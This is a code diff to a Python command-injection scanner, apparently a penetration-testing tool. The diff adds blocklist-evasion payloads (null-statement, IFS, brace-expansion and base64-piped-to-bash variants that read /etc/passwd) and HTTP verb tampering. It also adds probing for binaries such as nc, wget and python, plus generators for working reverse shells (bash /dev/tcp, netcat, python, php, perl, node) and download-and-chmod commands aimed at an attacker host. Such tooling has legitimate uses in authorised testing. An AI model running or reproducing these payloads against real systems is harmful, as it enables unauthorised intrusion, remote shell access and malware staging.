@@ -35,7 +35,8 @@ class Colors:
 class GhostInjections:
     def __init__(self, url: str, method: str = "GET", headers: Dict = None, 
                  cookies: Dict = None, timeout: int = 10, proxy: Dict = None,
-                 delay: float = 0, verbose: bool = False, user_agent: str = None):
+                 delay: float = 0, verbose: bool = False, user_agent: str = None,
+                 enable_verb_tampering: bool = True):
         self.url = url
         self.method = method.upper()
         self.headers = headers or {}
@@ -44,6 +45,7 @@ class GhostInjections:
         self.proxy = proxy
         self.delay = delay
         self.verbose = verbose
+        self.enable_verb_tampering = enable_verb_tampering
         self.vulnerabilities = []
         self.tested_payloads = 0
         self.baseline_response_time = None
@@ -59,6 +61,27 @@ class GhostInjections:
         
         # Generate random marker for this session
         self.session_marker = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+        
+        # Enumerated capabilities (populated during scanning)
+        self.target_capabilities = {}
+        
+        # Bypass techniques tracking
+        self.successful_bypass = None
+        self.working_operator = None
+        self.successful_verb = None
+        
+        # HTTP Verb Tampering methods to try
+        self.http_verbs = [
+            'POST', 'GET', 'PUT', 'DELETE', 'PATCH', 
+            'HEAD', 'OPTIONS', 'TRACE', 'CONNECT',
+            'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK',
+            'VERSION-CONTROL', 'REPORT', 'CHECKOUT', 'CHECKIN', 'UNCHECKOUT',
+            'MKWORKSPACE', 'UPDATE', 'LABEL', 'MERGE', 'BASELINE-CONTROL',
+        ]
+        
+        # Payload generation settings
+        self.lhost = None
+        self.lport = None
         
         # Command Injection Operators Reference
         # Based on industry standard testing methodology
@@ -262,6 +285,104 @@ class GhostInjections:
                 ";/bin/echo${IFS}test",
                 ";ca\\t${IFS}/etc/pa\\sswd",
             ],
+            "null_statement_bypass": [
+                # Null statement ($()) bypass - breaks up blocklisted strings
+                ";wh$()oami",
+                ";w$()h$()o$()a$()m$()i",
+                ";who$()ami",
+                ";whoa$()mi",
+                ";i$()d",
+                ";i$()$()d",
+                f";e$()c$()h$()o {self.session_marker}",
+                f";ec$()ho {self.session_marker}",
+                f";ech$()o {self.session_marker}",
+                "|wh$()oami",
+                "|i$()d",
+                "&&wh$()oami",
+                "&&i$()d",
+                "||wh$()oami",
+                "||i$()d",
+                "&wh$()oami",
+                "&i$()d",
+                # IFS bypass - space alternative
+                ";cat${IFS}/etc/passwd",
+                ";ls${IFS}-la",
+                f";echo${IFS}{self.session_marker}",
+                "|cat${IFS}/etc/passwd",
+                "&&cat${IFS}/etc/passwd",
+                ";c$()a$()t${IFS}/etc/passwd",
+                # Brace expansion bypass
+                ";{cat,/etc/passwd}",
+                ";{ls,-la}",
+                f";{{echo,{self.session_marker}}}",
+                # Combined bypasses
+                ";c$()a$()t${IFS}/etc/p$()asswd",
+                ";l$()s${IFS}-l$()a",
+            ],
+            "base64_bypass": [
+                # Base64 encoded payloads to bypass ALL filters
+                # id (aWQK)
+                ";`echo 'aWQK' | base64 -d`",
+                "|`echo 'aWQK' | base64 -d`",
+                "&&`echo 'aWQK' | base64 -d`",
+                "||`echo 'aWQK' | base64 -d`",
+                ";`echo aWQK | base64 -d`",
+                ";echo 'aWQK' | base64 -d | bash",
+                # whoami (d2hvYW1pCg==)
+                ";`echo 'd2hvYW1pCg==' | base64 -d`",
+                "|`echo 'd2hvYW1pCg==' | base64 -d`",
+                ";echo 'd2hvYW1pCg==' | base64 -d | bash",
+                # cat /etc/passwd (Y2F0IC9ldGMvcGFzc3dkCg==)
+                ";`echo 'Y2F0IC9ldGMvcGFzc3dkCg==' | base64 -d`",
+                "|`echo 'Y2F0IC9ldGMvcGFzc3dkCg==' | base64 -d`",
+                ";echo 'Y2F0IC9ldGMvcGFzc3dkCg==' | base64 -d | bash",
+                # hostname (aG9zdG5hbWUK)
+                ";`echo 'aG9zdG5hbWUK' | base64 -d`",
+                # Custom marker
+                f";`echo '{base64.b64encode(f'echo {self.session_marker}'.encode()).decode()}' | base64 -d | bash`",
+                # With null bypass in base64
+                ";`echo 'aWQK' | ba$()se64 -d`",
+                ";`echo 'aWQK' | b$()a$()s$()e64 -d`",
+            ],
+            "capability_enumeration": [
+                # File transfer capabilities
+                ";which wget",
+                ";which curl",
+                ";which fetch",
+                ";command -v wget",
+                ";command -v curl",
+                # Shell and networking
+                ";which nc",
+                ";which netcat",
+                ";which ncat",
+                ";which socat",
+                ";command -v nc",
+                # Scripting languages
+                ";which python",
+                ";which python3",
+                ";which php",
+                ";which perl",
+                ";which ruby",
+                ";which node",
+                ";which nodejs",
+                ";which java",
+                ";command -v python3",
+                ";command -v php",
+                # Compilation tools
+                ";which gcc",
+                ";which cc",
+                # Utilities
+                ";which base64",
+                ";which xxd",
+                ";which hexdump",
+                # Network tools
+                ";which ping",
+                ";which netstat",
+                ";which ss",
+                ";which ifconfig",
+                ";which ip",
+                ";which hostname",
+            ],
             "obfuscated_variables": [
                 ";$0whoami",
                 ";${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}whoami",
@@ -358,6 +479,51 @@ class GhostInjections:
                 f"; echo {base64.b64encode(b'whoami').decode()} | base64 -d | sh",
                 f"| echo {base64.b64encode(b'id').decode()} | base64 -d | sh",
                 f"; echo {base64.b64encode(b'pwd').decode()} | base64 -d | bash",
+                f";`echo '{base64.b64encode(b'whoami').decode()}' | base64 -d`",
+                f"|`echo '{base64.b64encode(b'id').decode()}' | base64 -d`",
+                f"&&`echo '{base64.b64encode(b'hostname').decode()}' | base64 -d`",
+                f";echo '{base64.b64encode(b'cat /etc/passwd').decode()}' | base64 -d | bash",
+            ],
+            "null_statement_bypass": [
+                # $() null statement bypass for blocklist evasion
+                "; w$()h$()o$()a$()m$()i",
+                "; wh$()oami",
+                "; who$()ami",
+                "; i$()d",
+                "; id${}",
+                "| wh$()oami",
+                "| i$()d",
+                "| ho$()stname",
+                "&& wh$()oami",
+                "&& i$()d",
+                "|| wh$()oami",
+                "|| i$()d",
+                "; e$()c$()h$()o test",
+                "| e$()c$()h$()o test",
+                "; c$()a$()t /etc/passwd",
+                "; p$()w$()d",
+                "; h$()o$()s$()t$()n$()a$()m$()e",
+            ],
+            "ifs_bypass": [
+                # ${IFS} for space bypass
+                ";cat${IFS}/etc/passwd",
+                "|cat${IFS}/etc/passwd",
+                "&&cat${IFS}/etc/passwd",
+                ";ls${IFS}-la",
+                ";echo${IFS}test",
+                "|ls${IFS}-la",
+                # Combined null + IFS
+                ";c$()a$()t${IFS}/etc/passwd",
+                ";l$()s${IFS}-la",
+            ],
+            "brace_expansion_bypass": [
+                # {command,args} - no spaces needed
+                ";{cat,/etc/passwd}",
+                "|{cat,/etc/passwd}",
+                "&&{cat,/etc/passwd}",
+                ";{ls,-la}",
+                ";{echo,test}",
+                ";{ls,-la,/tmp}",
             ],
             "wildcard_injection": [
                 "; /bin/wh?ami",
@@ -1443,11 +1609,26 @@ class GhostInjections:
                 if self.verbose or tested % 10 == 0:
                     print(f"    Progress: {tested} payloads tested...", end='\r')
                 
-                is_vulnerable, detection_type, details = self.test_payload(param, payload, data)
+                # Use verb tampering wrapper if enabled
+                if self.enable_verb_tampering:
+                    is_vulnerable, detection_type, details = self.test_payload_with_verb_tampering(param, payload, data)
+                else:
+                    is_vulnerable, detection_type, details = self.test_payload(param, payload, data)
                 
                 if is_vulnerable:
                     found += 1
                     category_vulns += 1
+                    
+                    # Track successful bypass technique
+                    if not self.successful_bypass:
+                        if 'null_statement' in category.lower():
+                            self.successful_bypass = 'null_statement'
+                        elif 'base64' in category.lower():
+                            self.successful_bypass = 'base64'
+                        elif 'ifs' in category.lower():
+                            self.successful_bypass = 'ifs_bypass'
+                        elif detection_type == 'http_verb_tampering':
+                            self.successful_bypass = 'http_verb_tampering'
                     
                     vuln = {
                         "parameter": param,
@@ -1456,6 +1637,7 @@ class GhostInjections:
                         "category": category,
                         "detection_type": detection_type,
                         "confidence": details.get('confidence', 'UNKNOWN'),
+                        "http_method": details.get('method', self.method),  # Track which HTTP method worked
                         "details": details
                     }
                     self.vulnerabilities.append(vuln)
@@ -1475,6 +1657,8 @@ class GhostInjections:
                     print(f"      Parameter: {Colors.BOLD}{param}{Colors.ENDC}")
                     print(f"      Payload: {Colors.CYAN}{payload}{Colors.ENDC}")
                     print(f"      URL-Encoded: {Colors.CYAN}{urllib.parse.quote(payload)}{Colors.ENDC}")
+                    if detection_type == 'http_verb_tampering':
+                        print(f"      {Colors.GREEN}HTTP Method: {details.get('method', self.method)}{Colors.ENDC}")
                     print(f"      Detection: {details.get('detection', 'Unknown')}")
                     print(f"      Type: {detection_type}")
                     
@@ -1504,6 +1688,16 @@ class GhostInjections:
         print(f"\n{Colors.CYAN}{Colors.BOLD}[*] Parameter Summary: {param}{Colors.ENDC}")
         print(f"    Total Payloads Tested: {tested}")
         print(f"    Vulnerabilities Found: {found}")
+        
+        # If vulnerabilities found, test bypass techniques first
+        if found > 0 and not self.successful_bypass:
+            print(f"\n{Colors.YELLOW}[*] Vulnerability detected! Testing advanced bypass techniques...{Colors.ENDC}")
+            self.test_comprehensive_bypasses(param, data)
+        
+        # Then enumerate capabilities
+        if found > 0 and not self.target_capabilities:
+            print(f"\n{Colors.YELLOW}[*] Enumerating target capabilities...{Colors.ENDC}")
+            self.enumerate_capabilities(param, data)
         
         if found > 0:
             confidence_counts = {}
@@ -1749,6 +1943,471 @@ class GhostInjections:
             stats['by_parameter'][param] = stats['by_parameter'].get(param, 0) + 1
         
         return stats
+    
+    def test_null_statement_bypass(self, param: str, data: Dict = None) -> bool:
+        """Test null statement injection bypass techniques ($())"""
+        if self.verbose:
+            print(f"\n{Colors.CYAN}[*] Testing Null Statement Bypass ($())...{Colors.ENDC}")
+        
+        marker = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+        
+        # Null statement bypass payloads with unique marker
+        null_bypasses = [
+            f"w$()h$()o$()a$()m$()i",
+            f"wh$()oami",
+            f"who$()ami",
+            f"i$()d",
+            f"ec$()ho {marker}",
+            f"e$()c$()h$()o {marker}",
+        ]
+        
+        operators = [";", "&&", "|", "||", "%0a", "&"]
+        
+        for op in operators:
+            for bypass in null_bypasses:
+                if 'echo' in bypass and marker in bypass:
+                    payload = f"test{op}{bypass}"
+                    
+                    if self.verbose:
+                        print(f"{Colors.BLUE}  [>] Testing: {payload}{Colors.ENDC}")
+                    
+                    is_vulnerable, detection_type, details = self.test_payload(param, payload, data)
+                    
+                    if is_vulnerable:
+                        # Verify marker actually appears (not just reflection)
+                        response_text = details.get('evidence', '')
+                        # Remove the payload from response to check for real execution
+                        cleaned = response_text.replace(payload, "")
+                        if marker in cleaned:
+                            print(f"{Colors.GREEN}[+] NULL STATEMENT BYPASS CONFIRMED!{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Operator: {op}{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Technique: {bypass}{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Marker verified: {marker}{Colors.ENDC}")
+                            self.successful_bypass = f"null_statement_{op}"
+                            self.working_operator = op
+                            return True
+        
+        return False
+    
+    def test_base64_bypass(self, param: str, data: Dict = None) -> bool:
+        """Test base64 encoding bypass for blocklist evasion"""
+        if self.verbose:
+            print(f"\n{Colors.CYAN}[*] Testing Base64 Encoding Bypass...{Colors.ENDC}")
+        
+        marker = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+        
+        # Commands to encode
+        commands_to_test = [
+            f"echo {marker}",
+            "whoami",
+            "id",
+        ]
+        
+        for cmd in commands_to_test:
+            # Encode command
+            encoded = base64.b64encode(cmd.encode()).decode()
+            
+            # Various base64 execution methods
+            base64_payloads = [
+                f";`echo '{encoded}' | base64 -d`",
+                f"| `echo '{encoded}' | base64 -d`",
+                f"&& `echo '{encoded}' | base64 -d`",
+                f";echo '{encoded}' | base64 -d | bash",
+            ]
+            
+            for payload in base64_payloads:
+                if self.verbose:
+                    print(f"{Colors.BLUE}  [>] Testing: {payload[:60]}...{Colors.ENDC}")
+                
+                is_vulnerable, detection_type, details = self.test_payload(param, payload, data)
+                
+                if is_vulnerable:
+                    if 'echo' in cmd and marker in cmd:
+                        # Verify marker
+                        response_text = details.get('evidence', '')
+                        cleaned = response_text.replace(payload, "").replace(encoded, "")
+                        if marker in cleaned:
+                            print(f"{Colors.GREEN}[+] BASE64 BYPASS CONFIRMED!{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Original: {cmd}{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Encoded: {encoded}{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Marker verified: {marker}{Colors.ENDC}")
+                            self.successful_bypass = "base64"
+                            return True
+                    else:
+                        # Check for known command outputs
+                        evidence = details.get('evidence', '').lower()
+                        if ('whoami' in cmd and any(u in evidence for u in ['root', 'www-data', 'apache'])) or \
+                           ('id' in cmd and 'uid=' in evidence):
+                            print(f"{Colors.GREEN}[+] BASE64 BYPASS CONFIRMED!{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Command: {cmd}{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Payload: {payload}{Colors.ENDC}")
+                            self.successful_bypass = "base64"
+                            return True
+        
+        return False
+    
+    def test_ifs_bypass(self, param: str, data: Dict = None) -> bool:
+        """Test IFS (Internal Field Separator) bypass for space filtering"""
+        if self.verbose:
+            print(f"\n{Colors.CYAN}[*] Testing IFS Bypass (Space Alternative)...{Colors.ENDC}")
+        
+        marker = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+        
+        # IFS bypass payloads
+        ifs_payloads = [
+            f";echo${{{IFS}}}{marker}",
+            f"|echo${{{IFS}}}{marker}",
+            f"&&echo${{{IFS}}}{marker}",
+            f";cat${{{IFS}}}/etc/passwd",
+            f";ls${{{IFS}}}-la",
+        ]
+        
+        for payload in ifs_payloads:
+            if self.verbose:
+                print(f"{Colors.BLUE}  [>] Testing: {payload}{Colors.ENDC}")
+            
+            is_vulnerable, detection_type, details = self.test_payload(param, payload, data)
+            
+            if is_vulnerable:
+                if marker in payload:
+                    response_text = details.get('evidence', '')
+                    cleaned = response_text.replace(payload, "")
+                    if marker in cleaned:
+                        print(f"{Colors.GREEN}[+] IFS BYPASS CONFIRMED!{Colors.ENDC}")
+                        print(f"{Colors.GREEN}    Payload: {payload}{Colors.ENDC}")
+                        print(f"{Colors.GREEN}    Marker verified: {marker}{Colors.ENDC}")
+                        self.successful_bypass = "ifs"
+                        return True
+                else:
+                    evidence = details.get('evidence', '').lower()
+                    if 'root:x:0:0' in evidence or '/bin' in evidence:
+                        print(f"{Colors.GREEN}[+] IFS BYPASS CONFIRMED!{Colors.ENDC}")
+                        print(f"{Colors.GREEN}    Payload: {payload}{Colors.ENDC}")
+                        self.successful_bypass = "ifs"
+                        return True
+        
+        return False
+    
+    def test_comprehensive_bypasses(self, param: str, data: Dict = None) -> bool:
+        """Run all bypass techniques and track which one works"""
+        print(f"\n{Colors.CYAN}{'='*70}{Colors.ENDC}")
+        print(f"{Colors.CYAN}{Colors.BOLD}ADVANCED BYPASS TECHNIQUE TESTING{Colors.ENDC}")
+        print(f"{Colors.CYAN}{'='*70}{Colors.ENDC}")
+        
+        # Test each bypass technique
+        bypass_found = False
+        
+        # 1. Null statement bypass
+        if self.test_null_statement_bypass(param, data):
+            bypass_found = True
+        
+        # 2. Base64 bypass
+        if not bypass_found:
+            if self.test_base64_bypass(param, data):
+                bypass_found = True
+        
+        # 3. IFS bypass
+        if not bypass_found:
+            if self.test_ifs_bypass(param, data):
+                bypass_found = True
+        
+        if bypass_found:
+            print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] BYPASS TECHNIQUE CONFIRMED: {self.successful_bypass}{Colors.ENDC}")
+        else:
+            print(f"\n{Colors.YELLOW}[!] No advanced bypass technique worked{Colors.ENDC}")
+        
+        return bypass_found
+    
+    def test_http_verb_tampering(self, param: str, payload: str, data: Dict = None) -> bool:
+        """Test HTTP verb tampering to bypass method-based restrictions"""
+        if not self.enable_verb_tampering:
+            return False
+        
+        if self.verbose:
+            print(f"\n{Colors.CYAN}[*] Testing HTTP Verb Tampering...{Colors.ENDC}")
+        
+        # Try each HTTP verb
+        for verb in self.http_verbs:
+            if verb == self.method:
+                continue  # Skip the original method
+            
+            try:
+                if self.verbose:
+                    print(f"{Colors.BLUE}  [>] Trying HTTP {verb}...{Colors.ENDC}")
+                
+                # Build request based on verb
+                test_data = data.copy() if data else {}
+                test_data[param] = payload
+                
+                if verb in ['GET', 'HEAD', 'OPTIONS', 'TRACE']:
+                    # Use query parameters
+                    response = requests.request(
+                        verb,
+                        self.url,
+                        params=test_data,
+                        headers=self.headers,
+                        cookies=self.cookies,
+                        timeout=self.timeout,
+                        proxies=self.proxy,
+                        allow_redirects=False
+                    )
+                else:
+                    # Use body
+                    response = requests.request(
+                        verb,
+                        self.url,
+                        data=test_data,
+                        headers=self.headers,
+                        cookies=self.cookies,
+                        timeout=self.timeout,
+                        proxies=self.proxy,
+                        allow_redirects=False
+                    )
+                
+                # Check if response indicates execution
+                if response.status_code not in [404, 405, 501]:
+                    # Check for marker or known outputs
+                    if self.session_marker in response.text:
+                        print(f"{Colors.GREEN}[+] HTTP VERB TAMPERING SUCCESSFUL!{Colors.ENDC}")
+                        print(f"{Colors.GREEN}    Working Method: {verb}{Colors.ENDC}")
+                        print(f"{Colors.GREEN}    Status Code: {response.status_code}{Colors.ENDC}")
+                        self.successful_verb = verb
+                        return True
+                    
+                    # Check for command output patterns
+                    if any(pattern in response.text.lower() for pattern in ['uid=', 'gid=', 'root:', 'www-data', '/bin/bash']):
+                        print(f"{Colors.GREEN}[+] HTTP VERB TAMPERING SUCCESSFUL!{Colors.ENDC}")
+                        print(f"{Colors.GREEN}    Working Method: {verb}{Colors.ENDC}")
+                        print(f"{Colors.GREEN}    Status Code: {response.status_code}{Colors.ENDC}")
+                        self.successful_verb = verb
+                        return True
+                        
+            except Exception as e:
+                if self.verbose:
+                    print(f"{Colors.RED}  [-] {verb} failed: {e}{Colors.ENDC}")
+                continue
+        
+        return False
+    
+    def test_payload_with_verb_tampering(self, param: str, payload: str, data: Dict = None) -> Tuple[bool, str, Dict]:
+        """Test payload with original method, then try verb tampering if it fails"""
+        # First try with original method
+        is_vulnerable, detection_type, details = self.test_payload(param, payload, data)
+        
+        if is_vulnerable:
+            return True, detection_type, details
+        
+        # If original method failed and verb tampering is enabled, try alternative verbs
+        if self.enable_verb_tampering:
+            if self.verbose:
+                print(f"{Colors.YELLOW}[*] Original method failed, attempting verb tampering...{Colors.ENDC}")
+            
+            if self.test_http_verb_tampering(param, payload, data):
+                return True, "http_verb_tampering", {
+                    'parameter': param,
+                    'payload': payload,
+                    'method': self.successful_verb,
+                    'evidence': 'Command executed via HTTP verb tampering'
+                }
+        
+        return False, "none", {}
+    
+    def enumerate_capabilities(self, param: str, data: Dict = None) -> Dict[str, bool]:
+        """Enumerate available binaries on target"""
+        if self.verbose:
+            print(f"\n{Colors.CYAN}[*] Enumerating Target Capabilities...{Colors.ENDC}")
+        
+        capabilities = {
+            # File transfer
+            'wget': False, 'curl': False, 'fetch': False,
+            # Compilation
+            'gcc': False, 'cc': False,
+            # Shells and networking
+            'nc': False, 'netcat': False, 'socat': False, 'ncat': False,
+            # Network utilities
+            'ping': False, 'netstat': False, 'ss': False, 'ifconfig': False, 'ip': False, 'hostname': False,
+            # Scripting languages
+            'php': False, 'python': False, 'python3': False, 'perl': False, 'ruby': False, 'node': False, 'nodejs': False, 'java': False,
+            # File utilities
+            'base64': False, 'xxd': False, 'hexdump': False,
+        }
+        
+        # Use the successful bypass technique if found
+        operator = ";"
+        bypass = ""
+        
+        if self.successful_bypass:
+            if 'null_statement' in self.successful_bypass:
+                bypass = "$()"
+            elif 'ifs' in self.successful_bypass:
+                bypass = "${IFS}"
+        
+        # Test each capability
+        for binary in capabilities.keys():
+            # Try different operators
+            test_payloads = [
+                f";which {bypass}{binary}" if bypass else f";which {binary}",
+                f"|which {binary}",
+                f"&&which {binary}",
+            ]
+            
+            for test_payload in test_payloads:
+                is_vulnerable, _, details = self.test_payload(param, test_payload, data)
+                
+                if is_vulnerable:
+                    # Check if binary path found in response
+                    if details.get('evidence'):
+                        evidence_lower = details['evidence'].lower()
+                        if f"/{binary}" in evidence_lower or f"usr/bin/{binary}" in evidence_lower:
+                            capabilities[binary] = True
+                            if self.verbose:
+                                print(f"{Colors.GREEN}  [+] Found: {binary}{Colors.ENDC}")
+                            break
+        
+        self.target_capabilities = capabilities
+        
+        # Print summary
+        found = [k for k, v in capabilities.items() if v]
+        if found and self.verbose:
+            print(f"\n{Colors.GREEN}[+] Available Capabilities:{Colors.ENDC}")
+            for cap in found:
+                print(f"    • {cap}")
+        
+        return capabilities
+    
+    def generate_reverse_shell_payloads(self, lhost: str, lport: int) -> List[Dict]:
+        """Generate reverse shell payloads based on enumerated capabilities"""
+        payloads = []
+        
+        # Determine bypass technique
+        prefix = ";"
+        if self.successful_bypass:
+            if 'null_statement' in self.successful_bypass:
+                prefix = ";b$()a$()sh -c '"
+                suffix = "'"
+            elif 'base64' in self.successful_bypass:
+                prefix = ";`echo '"
+                suffix = "' | base64 -d | bash`"
+            else:
+                prefix = ";"
+                suffix = ""
+        else:
+            suffix = ""
+        
+        caps = self.target_capabilities
+        
+        # Bash reverse shells
+        bash_shells = [
+            {
+                'name': 'Bash TCP',
+                'payload': f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
+                'required': []
+            },
+        ]
+        payloads.extend(bash_shells)
+        
+        # Netcat reverse shells
+        if caps.get('nc') or caps.get('netcat') or caps.get('ncat'):
+            netcat_shells = [
+                {
+                    'name': 'Netcat -e',
+                    'payload': f"nc -nv {lhost} {lport} -e /bin/bash",
+                    'required': ['nc']
+                },
+                {
+                    'name': 'Netcat mkfifo',
+                    'payload': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
+                    'required': ['nc']
+                }
+            ]
+            payloads.extend(netcat_shells)
+        
+        # Python reverse shells
+        if caps.get('python') or caps.get('python3'):
+            python_cmd = 'python3' if caps.get('python3') else 'python'
+            python_shell = {
+                'name': f'Python ({python_cmd})',
+                'payload': f"{python_cmd} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                'required': [python_cmd]
+            }
+            payloads.append(python_shell)
+        
+        # PHP reverse shells
+        if caps.get('php'):
+            php_shells = [
+                {
+                    'name': 'PHP system',
+                    'payload': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                    'required': ['php']
+                },
+            ]
+            payloads.extend(php_shells)
+        
+        # Perl reverse shell
+        if caps.get('perl'):
+            perl_shell = {
+                'name': 'Perl',
+                'payload': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+                'required': ['perl']
+            }
+            payloads.append(perl_shell)
+        
+        # Node.js reverse shell
+        if caps.get('node') or caps.get('nodejs'):
+            node_shell = {
+                'name': 'Node.js',
+                'payload': f"node -e 'require(\"child_process\").exec(\"nc -nv {lhost} {lport} -e /bin/bash\")'",
+                'required': ['node']
+            }
+            payloads.append(node_shell)
+        
+        return payloads
+    
+    def generate_file_transfer_payloads(self, lhost: str, filename: str) -> List[Dict]:
+        """Generate file transfer payloads based on enumerated capabilities"""
+        payloads = []
+        caps = self.target_capabilities
+        
+        if caps.get('wget'):
+            payloads.append({
+                'name': 'wget',
+                'payload': f"wget http://{lhost}/{filename} -O /tmp/{filename} ; chmod 755 /tmp/{filename}",
+                'required': ['wget']
+            })
+        
+        if caps.get('curl'):
+            payloads.append({
+                'name': 'curl',
+                'payload': f"curl http://{lhost}/{filename} -o /tmp/{filename} ; chmod 755 /tmp/{filename}",
+                'required': ['curl']
+            })
+        
+        # Python download
+        if caps.get('python') or caps.get('python3'):
+            python_cmd = 'python3' if caps.get('python3') else 'python'
+            payloads.append({
+                'name': f'Python ({python_cmd})',
+                'payload': f"{python_cmd} -c 'import urllib.request; urllib.request.urlretrieve(\"http://{lhost}/{filename}\", \"/tmp/{filename}\")'",
+                'required': [python_cmd]
+            })
+        
+        # PHP download
+        if caps.get('php'):
+            payloads.append({
+                'name': 'PHP',
+                'payload': f"php -r 'file_put_contents(\"/tmp/{filename}\", file_get_contents(\"http://{lhost}/{filename}\"));'",
+                'required': ['php']
+            })
+        
+        # Perl download
+        if caps.get('perl'):
+            payloads.append({
+                'name': 'Perl',
+                'payload': f"perl -e 'use LWP::Simple; getstore(\"http://{lhost}/{filename}\", \"/tmp/{filename}\");'",
+                'required': ['perl']
+            })
+        
+        return payloads
 
 
 def main():
@@ -1757,31 +2416,35 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # Basic GET parameter test
-  python3 ghost_injections.py -u "http://target.com/ping?host=127.0.0.1" -p host
+  # Basic scan (automatically tests bypass techniques)
+  python3 ghost_injections.py -u "http://192.168.61.80/zipProject.php" -m POST -d "archiveName=test&submit=Zip+It%21" -p archiveName -c "PHPSESSID=abc123" -v
   
-  # POST request with data
-  python3 ghost_injections.py -u "http://target.com/api/execute" -m POST -p cmd -d "cmd=test&other=value"
+  # With capability enumeration and reverse shell generation
+  python3 ghost_injections.py -u "http://target.com/ping" -p host --generate-shells --lhost 10.10.14.5 --lport 9090 -v
+  
+  # Generate file transfer payloads
+  python3 ghost_injections.py -u "http://target.com/ping" -p host --generate-transfer nc --lhost 10.10.14.5 -v
+  
+  # Test specific bypass categories only
+  python3 ghost_injections.py -u "http://target.com/ping" -p host --categories "null_statement_bypass,base64_obfuscation,ifs_bypass" -v
+  
+  # Full engagement scan with reports
+  python3 ghost_injections.py -u "http://target.com/api" -p input -m POST -d "input=test" --generate-shells --lhost 10.10.14.5 -o report.json --export-transactions transactions.json -v
   
   # Multiple parameters with proxy (Burp Suite)
-  python3 ghost_injections.py -u "http://target.com/search" -p q,filter,sort --proxy http://127.0.0.1:8080
+  python3 ghost_injections.py -u "http://target.com/search" -p q,filter,sort --proxy http://127.0.0.1:8080 -v
   
   # Authenticated testing with custom headers
-  python3 ghost_injections.py -u "http://target.com/admin/cmd" -p command -H "Authorization:Bearer TOKEN" -c "session=abc123"
-  
-  # Full scan with output report
-  python3 ghost_injections.py -u "http://target.com/api" -p input -t 5 -o report.json -v
-  
-  # Test specific categories only
-  python3 ghost_injections.py -u "http://target.com/ping" -p host --categories "time_based_unix_sleep,output_marker_basic"
+  python3 ghost_injections.py -u "http://target.com/admin/cmd" -p command -H "Authorization:Bearer TOKEN" -c "session=abc123" -v
 
 Ghost Ops Security - Professional Penetration Testing
+Built-in Bypass Techniques: Null Statements, Base64, IFS, Brace Expansion
         """
     )
     
-    # Required arguments
-    parser.add_argument("-u", "--url", required=True, help="Target URL")
-    parser.add_argument("-p", "--params", required=True, help="Parameters to test (comma-separated)")
+    # Required arguments (unless listing categories)
+    parser.add_argument("-u", "--url", help="Target URL")
+    parser.add_argument("-p", "--params", help="Parameters to test (comma-separated)")
     
     # Request configuration
     parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], 
@@ -1814,6 +2477,21 @@ Ghost Ops Security - Professional Penetration Testing
     parser.add_argument("--list-categories", action="store_true",
                        help="List all available payload categories and exit")
     
+    # Bypass techniques
+    parser.add_argument("--enable-verb-tampering", action="store_true", default=True,
+                       help="Enable HTTP verb tampering to bypass method restrictions (default: enabled)")
+    parser.add_argument("--disable-verb-tampering", action="store_true",
+                       help="Disable HTTP verb tampering")
+    
+    # Post-exploitation payload generation
+    parser.add_argument("--enum-capabilities", action="store_true",
+                       help="Enumerate target capabilities (wget, python, nc, etc.)")
+    parser.add_argument("--generate-shells", action="store_true",
+                       help="Generate reverse shell payloads based on detected capabilities")
+    parser.add_argument("--lhost", help="Local host IP for reverse shells")
+    parser.add_argument("--lport", type=int, default=9090, help="Local port for reverse shells (default: 9090)")
+    parser.add_argument("--generate-transfer", help="Generate file transfer payloads for specified filename")
+    
     args = parser.parse_args()
     
     # List categories if requested
@@ -1824,6 +2502,10 @@ Ghost Ops Security - Professional Penetration Testing
             print(f"  {Colors.YELLOW}{category:30s}{Colors.ENDC} - {len(payloads)} payloads")
         print(f"\n{Colors.CYAN}Total: {len(tester.payloads)} categories, {sum(len(v) for v in tester.payloads.values())} payloads{Colors.ENDC}\n")
         sys.exit(0)
+    
+    # Validate required arguments
+    if not args.url or not args.params:
+        parser.error("the following arguments are required: -u/--url, -p/--params")
     
     # Parse headers
     headers = {}
@@ -1877,6 +2559,8 @@ Ghost Ops Security - Professional Penetration Testing
             sys.exit(1)
     
     # Create tester instance
+    enable_verb = not args.disable_verb_tampering if hasattr(args, 'disable_verb_tampering') else True
+    
     tester = GhostInjections(
         url=args.url,
         method=args.method,
@@ -1886,7 +2570,8 @@ Ghost Ops Security - Professional Penetration Testing
         proxy=proxy,
         delay=args.delay,
         verbose=args.verbose,
-        user_agent=args.user_agent
+        user_agent=args.user_agent,
+        enable_verb_tampering=enable_verb
     )
     
     # Print banner
@@ -1906,6 +2591,80 @@ Ghost Ops Security - Professional Penetration Testing
         # Export HTTP transactions if requested
         if args.export_transactions:
             tester.export_transactions(args.export_transactions)
+        
